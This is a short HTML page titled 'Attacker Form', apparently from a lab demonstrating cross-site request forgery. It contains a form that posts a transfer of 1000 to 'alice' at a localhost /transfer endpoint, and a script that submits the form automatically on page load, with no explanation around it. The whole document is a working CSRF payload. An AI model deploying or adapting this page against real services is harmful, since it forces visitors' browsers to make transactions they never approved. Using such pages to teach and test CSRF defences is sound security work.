<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attacker Form</title>
</head>
<body>
    <form id="attackForm" method="POST" action="http://localhost:4000/transfer">
        <input name="amount" value="1000" />
        <input name="to" value="alice" />
        <input type="submit" value="Send" />
    </form>
    <script>
      window.onload = function () {
        console.log('Submitting form...');
        var form = document.getElementById('attackForm');
        
        // submit the form
        form.submit();
      };
    </script>
</body>
</html>
